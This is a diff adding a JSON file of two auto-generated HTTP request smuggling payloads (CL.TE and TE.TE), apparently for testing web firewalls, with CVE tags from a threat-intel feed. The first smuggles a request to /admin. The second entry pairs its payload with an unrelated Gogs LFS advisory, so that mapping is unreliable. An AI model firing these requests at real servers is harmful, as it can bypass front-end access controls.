@@ -1,0 +1,52 @@
+{
+  "category": "http_smuggling",
+  "subcategory": "threat_intel_http_smuggling",
+  "description": "Auto-discovered payloads from threat intelligence feeds",
+  "source": "fray threat-intel feed",
+  "count": 2,
+  "payloads": [
+    {
+      "id": "threat-intel-CVE-2026-2835-0000",
+      "category": "http_smuggling",
+      "subcategory": "cl_te",
+      "payload": "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n",
+      "description": "CVE-2026-2835: Pingora has HTTP Request Smuggling via HTTP/1.0 and Transfer-Encoding Misparsing",
+      "source": "GitHub Security Advisory",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "cve": "CVE-2026-2835",
+      "severity": "critical",
+      "reference": "https://github.com/advisories/GHSA-hj7x-879w-vrp7",
+      "technique": "cl_te",
+      "date_discovered": "2026-03-09",
+      "tags": [
+        "auto-generated",
+        "threat-intel",
+        "cve-2026-2835"
+      ]
+    },
+    {
+      "id": "threat-intel-CVE-2026-25921-0001",
+      "category": "http_smuggling",
+      "subcategory": "te_te",
+      "payload": "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n",
+      "description": "CVE-2026-25921: Gogs: Cross-repository LFS object overwrite via missing content hash verification",
+      "source": "GitHub Security Advisory",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "cve": "CVE-2026-25921",
+      "severity": "critical",
+      "reference": "https://github.com/advisories/GHSA-cj4v-437j-jq4c",
+      "technique": "te_te",
+      "date_discovered": "2026-03-09",
+      "tags": [
+        "auto-generated",
+        "threat-intel",
+        "cve-2026-25921"
+      ]
+    }
+  ],
+  "last_updated": "2026-03-09T06:02:41.037983+00:00"
+}
